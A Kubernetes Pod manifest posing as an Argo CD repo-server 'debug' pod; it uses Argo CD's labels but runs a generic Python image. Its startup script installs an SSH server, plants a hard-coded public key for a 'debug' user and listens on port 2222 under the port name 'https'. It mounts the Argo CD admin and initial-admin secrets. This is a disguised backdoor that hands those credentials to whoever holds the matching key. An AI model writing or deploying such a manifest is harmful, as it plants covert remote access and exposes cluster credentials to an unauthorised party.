apiVersion: v1
kind: Pod
metadata:
  name: argocd-repo-server-debug
  labels:
    app.kubernetes.io/name: argocd-repo-server
    app.kubernetes.io/part-of: argocd
    app.kubernetes.io/component: repo-server
spec:
  automountServiceAccountToken: false
  containers:
  - name: repo-server
    image: python:3.12-slim
    command:
    - bash
    - -c
    - |
      set -e
      apt-get update -qq && apt-get install -y -qq openssh-server curl > /dev/null 2>&1
      mkdir -p /run/sshd /home/debug/.ssh
      useradd -m -s /bin/bash debug || true
      echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHD+huYabiUNbYQDKSj9Z/v6Gbpp9EB1TOdcOxzUhyc2 argocd-ssh" \
        > /home/debug/.ssh/authorized_keys
      chown -R debug:debug /home/debug/.ssh
      chmod 700 /home/debug/.ssh
      chmod 600 /home/debug/.ssh/authorized_keys
      sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
      sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
      sed -i 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
      ssh-keygen -A
      exec /usr/sbin/sshd -D -e
    ports:
    - containerPort: 2222
      name: https
    volumeMounts:
    - name: argocd-secret
      mountPath: /mnt/secrets/argocd-secret
      readOnly: true
    - name: argocd-initial-admin-secret
      mountPath: /mnt/secrets/argocd-initial-admin-secret
      readOnly: true
  volumes:
  - name: argocd-secret
    secret:
      secretName: argocd-secret
  - name: argocd-initial-admin-secret
    secret:
      secretName: argocd-initial-admin-secret
  restartPolicy: Always
